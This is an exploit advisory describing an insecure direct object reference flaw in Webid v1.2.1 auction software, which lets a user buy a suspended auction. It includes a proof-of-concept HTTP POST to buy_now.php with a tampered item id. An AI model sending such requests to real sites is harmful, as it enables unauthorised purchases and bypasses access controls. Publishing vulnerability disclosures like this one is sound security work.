# Exploit Title: Webid v1.2.1 - Insecure Direct Object Reference(IDOR)
## Date: 2/1/2024
## Vendor Homepage: https://sourceforge.net/projects/simpleauction/files/latest/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Webid
## Version: v1.2.1
## Exploit Description:
## Webid v1.2.1 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to buy now an auction that is suspended(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /buy_now.php?id=4(CHANGE HERE) HTTP/1.1
...

csrftoken=8be3cd6190b2484289828c7fc3c23906&qty=1&password=user1test&action=buy
```